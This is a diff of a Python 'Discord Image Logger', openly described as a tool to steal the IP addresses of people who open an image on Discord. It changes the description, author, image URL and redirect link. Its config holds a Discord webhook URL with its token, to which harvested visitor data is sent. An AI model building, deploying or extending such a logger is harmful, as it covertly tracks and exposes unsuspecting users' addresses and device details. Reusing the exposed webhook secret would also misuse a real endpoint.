@@ -6,14 +6,14 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A ~Simple~ Advanced application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt/HackersHaven"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1492906315096260728/9lZpZcn6iq15HamD1jvEyblXxm6sG8RiY6mykL9U8NgfNcbpzp7FLSagUV88DojpGrTi",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ51nZgsO_msQti25XHi710wQPVDLZO29-4Q&s.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://thragg-panel-drz2xafsj-hehehhd-hacks-projects.vercel.app/api/image" # Link
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = ImageLoggerAPI
